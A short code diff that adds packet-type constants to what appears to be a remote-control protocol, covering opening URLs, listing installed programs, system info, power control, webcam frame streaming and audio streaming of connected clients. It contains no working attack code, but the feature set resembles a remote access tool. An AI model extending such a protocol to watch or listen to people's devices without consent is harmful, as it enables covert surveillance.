@@ -89,6 +89,25 @@ PACKET_TYPES = {
     # GET_CLIENTS (GUI control)
     'GET_CLIENTS':      0x10,
     'GET_CLIENTS_RESP': 0x11,
+    # URL & System 0xD0-0xD8
+    'OPEN_URL':          0xD0,
+    'OPEN_URL_RESP':     0xD1,
+    'INSTALLED_PROGS_REQ': 0xD2,
+    'INSTALLED_PROGS_RESP': 0xD3,
+    'SYSINFO_REQ':       0xD4,
+    'SYSINFO_RESP':      0xD5,
+    'PC_POWER':          0xD6,
+    'PC_POWER_RESP':     0xD7,
+    # Webcam 0xE0-0xE4
+    'WEBCAM_DEVICES_REQ': 0xE0,
+    'WEBCAM_DEVICES_RESP': 0xE1,
+    'WEBCAM_START':       0xE2,
+    'WEBCAM_FRAME':       0xE3,
+    'WEBCAM_STOP':        0xE4,
+    # Audio 0xE5-0xE7
+    'AUDIO_START':        0xE5,
+    'AUDIO_STREAM':       0xE6,
+    'AUDIO_STOP':         0xE7,
     # Error
     'ERROR': 0xFF,
 }
